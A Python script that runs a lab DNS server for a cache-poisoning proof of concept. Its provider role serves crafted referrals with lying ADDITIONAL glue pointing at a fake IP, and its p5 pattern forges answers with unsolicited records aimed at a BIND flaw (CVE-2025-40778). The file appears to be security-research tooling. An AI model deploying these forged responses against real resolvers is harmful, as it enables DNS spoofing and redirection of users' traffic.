#!/usr/bin/env python3
"""
lab_dns.py -- authoritative DNS lab for the "yes, it's a problem" PoC.

Roles
-----
provider : authoritative for --zone; returns a crafted referral for the child
           zone (--child.<zone>): an NS record plus an ADDITIONAL A record
           pointing at the fake IP.
true     : the legitimate nameserver for the victim child zone (true answers).
fake     : the attacker nameserver for the victim child zone (fake answers).

Legacy in-zone fixture (no --child-ns): the child-NS name is ns.true.<zone>,
inside the provider zone; the provider also answers A for that name, so the
model shows a lying ADDITIONAL record rather than a strict out-of-bailiwick
failure.  Names under true.<zone> resolve normally.

External child-NS contract (--child-ns, the deployment topology): the child
zone is delegated to an NS name OUTSIDE the provider zone (an ordinary record
in the parent zone, e.g. ns-child.example.com).  The provider's referral
carries that external NS name plus an ADDITIONAL A for it pointing at the
fake IP -- the unrelated-additional shape observed in the public case
recorded in artifacts/.  The provider holds no data for the external NS
name (out-of-zone queries get REFUSED); the parent zone keeps serving its
ordinary A record for the true IP.  The ADDITIONAL lie is data emitted by
this lab authority on the owner's own delegated zone, not a parent-zone
record.

Response patterns (--pattern, provider role)
-------------------------------------------
Four ADDITIONAL/bailiwick shapes can be served for probe_matrix.py (the
pattern layer only rewrites in-zone responses; out-of-zone queries are still
REFUSED and the default --pattern none keeps the legacy shapes byte-identical):

  p1  authoritative answer + an unrelated A in ADDITIONAL for a third-party
      name (trigger: a name in the provider zone outside the child zone).
  p2  referral (NS for the child zone) + an unrelated A in ADDITIONAL for a
      third-party name that is not the NS name (trigger: a child-zone name).
  p3  external-NS delegation glue: referral to an out-of-zone NS name with an
      ADDITIONAL A (glue) for that NS name -- exactly the --child-ns contract,
      so --pattern p3 requires --child-ns outside the provider zone.
  p4  answer section containing unrelated owner records: the answer carries an
      A for the queried name and an A owned by a third-party name (trigger as p1).

The unrelated/glue address is --third-party-ip (p1/p2/p4) or --fake-ip (p3);
probe_matrix.py reads TTLs from these records to tell cached-and-answerable
data from data merely used while resolving.

The local comparison checks these contradictory records and the configured
true/fake endpoints; it does not test a recursive resolver or tenant isolation.

Requires dnslib (vendored in ../vendor or installed with pip).
"""
import argparse
import json
import os
import signal
import sys
import threading
import time
from pathlib import Path

try:
    from dnslib import (A, AAAA, NS, QTYPE, RCODE, RR, SOA, TXT)
    from dnslib.server import BaseResolver, DNSServer, DNSLogger
except ImportError:
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "vendor"))
    from dnslib import (A, AAAA, NS, QTYPE, RCODE, RR, SOA, TXT)
    from dnslib.server import BaseResolver, DNSServer, DNSLogger


def norm(name):
    return str(name).rstrip(".").lower()


def in_zone(name, zone):
    return name == zone or name.endswith("." + zone)


def a_record(name, ip, ttl):
    return RR(name, QTYPE.A, rdata=A(ip), ttl=ttl)


def soa_record(zone, ns, ttl):
    return RR(
        zone,
        QTYPE.SOA,
        rdata=SOA(
            ns,
            "hostmaster." + zone,
            (int(time.time()), 3600, 600, 86400, ttl),
        ),
        ttl=ttl,
    )


class LabResolver(BaseResolver):
    def __init__(self, cfg, role):
        self.cfg = cfg
        self.role = role
        self.zone = norm(cfg["zone"])
        self.child = norm(cfg["child"] + "." + self.zone) if "." not in cfg["child"] else norm(cfg["child"])
        self.provider_ns = norm(cfg["provider_ns"])
        self.child_ns = norm(cfg["child_ns"]) if cfg.get("child_ns") else "ns.true." + self.zone
        self.true_ip = cfg["true_ip"]
        self.fake_ip = cfg["fake_ip"]
        self.ttl = int(cfg["ttl"])
        self.pattern = str(cfg.get("pattern") or "none").lower()
        if self.pattern not in ("none", "p1", "p2", "p3", "p4", "p5"):
            raise ValueError("unknown pattern %r" % (self.pattern,))
        self.third_party = norm(cfg["third_party"]) if cfg.get("third_party") else "unrelated.invalid"
        self.third_party_ip = cfg.get("third_party_ip") or self.fake_ip
        self.referral_owner = str(cfg.get("referral_owner") or "zone").lower()
        self.delegations = cfg.get("delegations") or []  # role root: [(zone, ns_name, ns_ip)]
        # task-15: second unrelated tree served by the SAME server (shared-hosting
        # topology: customer1.com + customer2.com on one NS)
        self.zone2 = norm(cfg["zone2"]) if cfg.get("zone2") else None
        self.third_party_type = str(cfg.get("third_party_type") or "A").upper()
        self.third_party_aaaa = cfg.get("third_party_aaaa") or "2001:db8::66"
        self.third_party_ns = cfg.get("third_party_ns") or "ns-inject.invalid"
        self.log_path = cfg.get("log")
        self.lock = threading.Lock()
        self.challenge_file = cfg.get("challenge_file")

    # ---------- helpers ----------
    def log(self, request, note):
        if not self.log_path:
            return
        try:
            qname = norm(request.q.qname)
            qtype = QTYPE[request.q.qtype]
            client = request._client if hasattr(request, "_client") else ""
            line = json.dumps({"ts": time.time(), "role": self.role, "qname": qname,
                               "qtype": qtype, "client": str(client), "note": note},
                              ensure_ascii=False)
            with self.lock:
                with open(self.log_path, "a", encoding="utf-8") as fh:
                    fh.write(line + "\n")
        except Exception:
            pass

    def _nxdomain(self, reply, zone):
        reply.header.aa = 1
        reply.header.rcode = RCODE.NXDOMAIN
        reply.add_auth(soa_record(zone, self.provider_ns, self.ttl))
        return reply

    def _txt_challenges(self, qname):
        path = self.challenge_file
        if not path or not os.path.exists(path):
            return []
        try:
            data = json.loads(Path(path).read_text(encoding="utf-8"))
        except Exception:
            return []
        return data.get(norm(qname), [])

    # ---------- provider role ----------
    def provider(self, request, reply):
        qname = norm(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        child = self.child

        # 1b. P5 (task-14, CVE-2025-40778 axis): a FORGED successful answer for
        # a delegated name carrying unsolicited/extra RRs in the ANSWER section
        # -- an A for a name outside the answering server's zone (out-of-zone
        # owner), for a name in a different zone (different-zone owner), or for
        # a name in another TREE served by the same server (same-server
        # different-tree owner, task-15 shared-hosting topology); the harness
        # picks the owner via --third-party and the record type via
        # --third-party-type A|AAAA|NS.  CVE-2025-40778: BIND is "too lenient
        # when accepting records from answers", allowing forged data to be
        # injected into the cache (9.18.0-9.18.39; fixed 9.18.41).
        if self.pattern == "p5" and in_zone(qname, child):
            reply.header.aa = 1
            reply.header.rcode = RCODE.NOERROR
            if qtype == "A":
                reply.add_answer(a_record(qname, self.true_ip, self.ttl))
            if self.third_party_type == "AAAA":
                reply.add_answer(RR(self.third_party, QTYPE.AAAA,
                                    rdata=AAAA(self.third_party_aaaa), ttl=self.ttl))
            elif self.third_party_type == "NS":
                reply.add_answer(RR(self.third_party, QTYPE.NS,
                                    rdata=NS(self.third_party_ns), ttl=self.ttl))
            else:
                reply.add_answer(a_record(self.third_party, self.third_party_ip, self.ttl))
            self.log(request, "pattern-p5-forged-answer-unsolicited-rr")
            return reply

        # 1c. tree-B (task-15): the SAME server is authoritative for a second,
        # unrelated tree (shared authoritative hosting); answers normally here.
        if self.zone2 and in_zone(qname, self.zone2):
            reply.header.aa = 1
            if qtype == "A":
                reply.add_answer(a_record(qname, self.true_ip, self.ttl))
                note = "zone2-a"
            else:
                note = "zone2-empty-" + qtype.lower()
            self.log(request, note)
            return reply

        # 1. Any query at or below the delegated victim zone -> crafted referral.
        if in_zone(qname, child):
            reply.header.aa = 0
            reply.header.rcode = RCODE.NOERROR
            owner = qname if self.referral_owner == "name" else child
            reply.add_auth(RR(owner, QTYPE.NS, rdata=NS(self.child_ns), ttl=self.ttl))
            if self.pattern == "p2":
                # P2: referral + an unrelated A for a third-party name that is
                # not the NS name.
                reply.add_ar(a_record(self.third_party, self.third_party_ip, self.ttl))
                self.log(request, "pattern-p2-referral-unrelated-additional")
                return reply
            # The malicious ADDITIONAL A (legacy shape and P3: external-NS
            # delegation glue -- an A for the (possibly out-of-zone) NS name).
            # The provider also answers A for this name; the lab server returns
            # the fake address here.
            reply.add_ar(a_record(self.child_ns, self.fake_ip, self.ttl))
            self.log(request, "pattern-p3-external-ns-glue" if self.pattern == "p3"
                     else "referral-with-malicious-additional")
            return reply

        # 2. Names under true.<zone> remain in the provider zone (no delegation).
        if qname == "true." + self.zone or qname.endswith(".true." + self.zone):
            reply.header.aa = 1
            if qtype == "A":
                reply.add_answer(a_record(qname, self.true_ip, self.ttl))
            elif qtype == "AAAA":
                pass
            else:
                reply.add_auth(soa_record(self.zone, self.provider_ns, self.ttl))
            self.log(request, "provider-ns-a")
            return reply

        # 3. The provider's own zone apex / NS / SOA.
        if qname == self.zone:
            reply.header.aa = 1
            if qtype == "SOA":
                reply.add_answer(soa_record(self.zone, self.provider_ns, self.ttl))
            elif qtype == "NS":
                reply.add_answer(RR(self.zone, QTYPE.NS, rdata=NS(self.provider_ns), ttl=self.ttl))
            elif qtype == "A":
                reply.add_answer(a_record(qname, self.cfg.get("provider_ip", "127.0.0.1"), self.ttl))
            else:
                reply.add_auth(soa_record(self.zone, self.provider_ns, self.ttl))
            self.log(request, "provider-apex")
            return reply

        # 3b. Response-pattern layer (P1/P4): in-zone names that would
        # otherwise be NXDOMAIN now carry the crafted response.
        if self.pattern in ("p1", "p4") and in_zone(qname, self.zone):
            reply.header.aa = 1
            if qtype == "A":
                reply.add_answer(a_record(qname, self.true_ip, self.ttl))
                if self.pattern == "p4":
                    # P4: an unrelated owner record inside the ANSWER section.
                    reply.add_answer(a_record(self.third_party, self.third_party_ip, self.ttl))
            if self.pattern == "p1":
                # P1: an unrelated A in ADDITIONAL for a third-party name.
                reply.add_ar(a_record(self.third_party, self.third_party_ip, self.ttl))
            self.log(request, "pattern-p1-answer-unrelated-additional" if self.pattern == "p1"
                     else "pattern-p4-answer-unrelated-owner")
            return reply

        # 4. Anything else in the provider zone is not authoritative / NXDOMAIN.
        self.log(request, "provider-nxdomain")
        return self._nxdomain(reply, self.zone)

    # ---------- child-zone authoritative role ----------
    def authoritative(self, request, reply):
        qname = norm(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        child = self.child
        ip = self.true_ip if self.role == "true" else self.fake_ip

        if not in_zone(qname, child):
            self.log(request, "not-in-child-zone")
            return self._nxdomain(reply, child)

        # Synthetic negative paths (task-9): names whose leftmost label starts
        # with --nxd-prefix answer NXDOMAIN with THIS endpoint's own zone SOA --
        # the shape measured in artifacts/dns-disc-2026-10-27.json, where the
        # negative answer carried the ADDITIONAL-supplied endpoint's SOA.
        nxd = str(self.cfg.get("nxd_prefix") or "").strip()
        if nxd and qname.split(".")[0].startswith(norm(nxd)):
            reply.header.aa = 1
            reply.header.rcode = RCODE.NXDOMAIN
            reply.add_auth(soa_record(child, self.child_ns, self.ttl))
            self.log(request, "synthetic-nxdomain")
            return reply

        reply.header.aa = 1
        if qtype == "A":
            reply.add_answer(a_record(qname, ip, self.ttl))
            note = "true-a" if self.role == "true" else "fake-a"
        elif qtype == "AAAA":
            note = "empty-aaaa"
        elif qtype == "SOA":
            reply.add_answer(soa_record(child, self.child_ns, self.ttl))
            note = "soa"
        elif qtype == "NS":
            reply.add_answer(RR(child, QTYPE.NS, rdata=NS(self.child_ns), ttl=self.ttl))
            note = "ns"
        elif qtype == "TXT":
            vals = self._txt_challenges(qname)
            if vals:
                for val in vals:
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(val), ttl=self.ttl))
                note = "txt-challenge"
            else:
                note = "empty-txt"
        else:
            note = "empty-" + qtype.lower()
        self.log(request, note)
        return reply

    def root(self, request, reply):
        """Delegating fake root/parent for the iterative probe suite: answers
        referrals from a --delegate table (ZONE=NS_NAME/NS_IP) so an out-of-zone
        NS name can be reached by normal iteration, never by pre-seeding."""
        qname = norm(request.q.qname)
        if qname in ("", "."):
            reply.header.aa = 1
            reply.add_answer(RR(".", QTYPE.NS, rdata=NS("a.root.lab.invalid"), ttl=self.ttl))
            reply.add_ar(a_record("a.root.lab.invalid", self.true_ip, self.ttl))
            self.log(request, "root-priming")
            return reply
        best = None
        for zone, ns, ip in self.delegations:
            if in_zone(qname, zone) and (best is None or len(zone) > len(best[0])):
                best = (zone, ns, ip)
        if best is None:
            self.log(request, "root-nxdomain")
            return self._nxdomain(reply, ".")
        zone, ns, ip = best
        reply.header.aa = 0
        reply.header.rcode = RCODE.NOERROR
        reply.add_auth(RR(zone, QTYPE.NS, rdata=NS(ns), ttl=self.ttl))
        reply.add_ar(a_record(ns, ip, self.ttl))
        self.log(request, "root-delegation")
        return reply

    def thirdparty(self, request, reply):
        """Authoritative server for the third-party zone: the 'true' side of
        the unrelated-name comparison (normal answers for its own names)."""
        qname = norm(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        reply.header.aa = 1
        if qtype == "A":
            reply.add_answer(a_record(qname, self.true_ip, self.ttl))
            note = "thirdparty-a"
        elif qtype == "AAAA":
            note = "thirdparty-empty-aaaa"
        elif qtype == "SOA":
            reply.add_answer(soa_record(self.zone, self.provider_ns, self.ttl))
            note = "thirdparty-soa"
        elif qtype == "NS":
            reply.add_answer(RR(self.zone, QTYPE.NS, rdata=NS(self.provider_ns), ttl=self.ttl))
            note = "thirdparty-ns"
        else:
            note = "thirdparty-empty-" + qtype.lower()
        self.log(request, note)
        return reply

    def resolve(self, request, handler):
        try:
            request._client = handler.client_address if handler is not None else ""
        except Exception:
            pass
        reply = request.reply()
        reply.header.ra = 0
        reply.header.ad = 0
        zone = self.zone if self.role in ("provider", "thirdparty") else self.child
        qn = norm(request.q.qname)
        if self.role == "provider" and self.zone2 and in_zone(qn, self.zone2):
            zone = self.zone2
        if self.role == "root":
            try:
                return self.root(request, reply)
            except Exception as exc:
                sys.stderr.write("resolve error: %r\n" % (exc,))
                reply.header.rcode = RCODE.SERVFAIL
                return reply
        if not in_zone(qn, zone):
            reply.header.aa = 0
            reply.header.rcode = RCODE.REFUSED
            return reply
        try:
            if self.role == "provider":
                return self.provider(request, reply)
            if self.role == "thirdparty":
                return self.thirdparty(request, reply)
            return self.authoritative(request, reply)
        except Exception as exc:
            sys.stderr.write("resolve error: %r\n" % (exc,))
            reply.header.rcode = RCODE.SERVFAIL
            return reply


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--role", required=True, choices=["provider", "true", "fake", "thirdparty", "root"])
    ap.add_argument("--bind", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--zone", required=True, help="provider zone, e.g. lab.example.com")
    ap.add_argument("--child", default="v", help="child label under zone, e.g. v -> v.lab.example.com")
    ap.add_argument("--provider-ns", required=True, help="NS name for the provider zone")
    ap.add_argument("--child-ns", default=None,
                    help="external NS name for the delegated child zone, outside the provider zone "
                         "(deployment contract); omit for the legacy in-zone fixture")
    ap.add_argument("--true-ip", required=True)
    ap.add_argument("--fake-ip", required=True)
    ap.add_argument("--provider-ip", default=None)
    ap.add_argument("--pattern", default="none", choices=["none", "p1", "p2", "p3", "p4", "p5"],
                    help="response pattern for the provider role (default: none = legacy shapes)")
    ap.add_argument("--third-party", default=None,
                    help="third-party owner name used by patterns p1/p2/p4 "
                         "(must be outside --zone; default unrelated.invalid)")
    ap.add_argument("--third-party-ip", default=None,
                    help="address claimed by the unrelated A record (default: --fake-ip)")
    ap.add_argument("--zone2", default=None,
                    help="provider role: second unrelated tree served by this same server "
                         "(task-15 shared-hosting topology)")
    ap.add_argument("--third-party-type", default="A", choices=["A", "AAAA", "NS"],
                    help="record type of the unsolicited RR shipped in the p5 forged answer")
    ap.add_argument("--third-party-aaaa", default=None,
                    help="value for the unsolicited AAAA record (p5 AAAA variant)")
    ap.add_argument("--third-party-ns", default=None,
                    help="value for the unsolicited NS record (p5 NS variant)")
    ap.add_argument("--delegate", action="append", default=[],
                    help="role root: delegation entry ZONE=NS_NAME/NS_IP (repeatable)")
    ap.add_argument("--referral-owner", default="zone", choices=["zone", "name"],
                    help="owner of the referral NS record: the delegated child zone (default, "
                         "deployment contract) or the queried name itself (public-trace shape)")
    ap.add_argument("--ttl", default="0")
    ap.add_argument("--log", default=None)
    ap.add_argument("--nxd-prefix", default=None,
                    help="true/fake roles: names whose leftmost label starts with this "
                         "prefix answer NXDOMAIN with this endpoint's own zone SOA")
    ap.add_argument("--challenge-file", default=None,
                    help="JSON map of TXT challenges for DNS-01 (optional)")
    args = ap.parse_args()

    zone = norm(args.zone)
    third_party = norm(args.third_party) if args.third_party else "unrelated.invalid"
    if args.pattern in ("p1", "p2", "p4") and in_zone(third_party, zone):
        ap.error("--third-party must sit outside the provider zone (%s)" % zone)
    if args.pattern == "p3":
        if not args.child_ns:
            ap.error("--pattern p3 requires --child-ns (external NS name outside the provider zone)")
        if in_zone(norm(args.child_ns), zone):
            ap.error("--pattern p3 requires an out-of-zone --child-ns")

    cfg = {
        "zone": args.zone,
        "child": args.child,
        "provider_ns": args.provider_ns,
        "child_ns": args.child_ns,
        "true_ip": args.true_ip,
        "fake_ip": args.fake_ip,
        "provider_ip": args.provider_ip or args.bind,
        "ttl": args.ttl,
        "pattern": args.pattern,
        "third_party": third_party,
        "third_party_ip": args.third_party_ip or args.fake_ip,
        "third_party_type": args.third_party_type,
        "third_party_aaaa": args.third_party_aaaa,
        "third_party_ns": args.third_party_ns,
        "zone2": args.zone2,
        "referral_owner": args.referral_owner,
        "delegations": [(d.split("=", 1)[0].strip(),
                         d.split("=", 1)[1].split("/")[0].strip(),
                         d.split("/", 1)[1].strip())
                        for d in args.delegate],
        "log": args.log,
        "nxd_prefix": args.nxd_prefix,
        "challenge_file": args.challenge_file,
    }
    resolver = LabResolver(cfg, args.role)
    logger = DNSLogger(log="-request,-reply,-truncated,-error")
    servers = [DNSServer(resolver, address=args.bind, port=args.port,
                         tcp=tcp, logger=logger) for tcp in (False, True)]
    for server in servers:
        server.start_thread()
    print("lab_dns role=%s bind=%s:%s zone=%s child=%s" %
          (args.role, args.bind, args.port, args.zone, resolver.child), flush=True)
    print("ready", flush=True)

    stop = threading.Event()

    def _stop(signum, frame):
        stop.set()

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)
    try:
        while not stop.wait(0.2):
            pass
    finally:
        for server in servers:
            server.stop()
            server.server.server_close()


if __name__ == "__main__":
    main()
